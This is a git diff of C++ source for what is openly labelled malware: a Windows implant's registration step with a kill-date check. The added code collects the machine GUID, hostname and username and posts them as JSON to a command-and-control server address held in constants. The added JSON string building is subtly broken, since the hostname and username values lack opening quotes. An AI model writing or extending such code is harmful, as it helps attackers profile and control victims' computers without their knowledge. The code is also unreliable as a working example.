@@ -2,8 +2,10 @@
 #include <string.h>
 #include <sysinfoapi.h>
 #include <winbase.h>
+#include <winreg.h>
+#include <lmcons.h>
 
-#include "config.h" 
+#include "config.h"
 #include "httpClient.h"
 
 int wmain(int argc, wchar_t **argv, wchar_t **envp)
@@ -26,16 +28,28 @@ int wmain(int argc, wchar_t **argv, wchar_t **envp)
         // LOG(L"Kill Date passed!\n");
         return -1;
     }
-    char systemGuidValue[255];
-    DWORD systemGuidBufferSize = sizeof(systemGuidValue);
-    if (RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", RRF_RT_REG_SZ, NULL, systemGuidValue, &systemGuidBufferSize) != 0)
+    wchar_t systemGuidValue[255];
+    DWORD systemGuidBufferSize = 255;
+    wchar_t systemHostname[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD systemHostnameBufferSize = MAX_COMPUTERNAME_LENGTH + 1;
+    wchar_t systemUsername[UNLEN + 1];
+    DWORD systemUsernameBufferSize = UNLEN + 1;
+    if (RegGetValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Cryptography", L"MachineGuid", RRF_RT_REG_SZ, NULL, systemGuidValue, &systemGuidBufferSize) != 0 || GetComputerNameW(systemHostname, &systemHostnameBufferSize) == 0 || GetUserNameW(systemUsername, &systemUsernameBufferSize) == 0)
     {
         // Can't register at this point don't know what to do yet.
-        // LOG(L"GUID: %s\n", systemGuidValue);
+        // LOG(L"GUID: %S\n", systemGuidValue);
         return -1;
     }
-    std::wstring requestHeader; // build post request header
-    std::wstring requestBody;   // build post request body i.e. json
+    std::wstring requestHeader(MALWARE_JSON_REQUEST_HEADER); // build post request header
+    std::wstring requestBody;                                // build post request body i.e. json
+    requestBody += L"{\"guid\":\"";
+    requestBody += systemGuidValue;
+    requestBody += L"\",\"hostname\":";
+    requestBody += systemHostname;
+    requestBody += L"\",\"username\":";
+    requestBody += systemUsername;
+    requestBody += L"\"}";
     std::wstring result = makeHttpRequest(MALWARE_C2_SERVER_ADDRESS, MALWARE_C2_SERVER_PORT, MALWARE_C2_SERVER_REGISTER_URI, requestHeader, requestBody, false);
+    std::wcout << result << std::endl;
     return 0;
 }
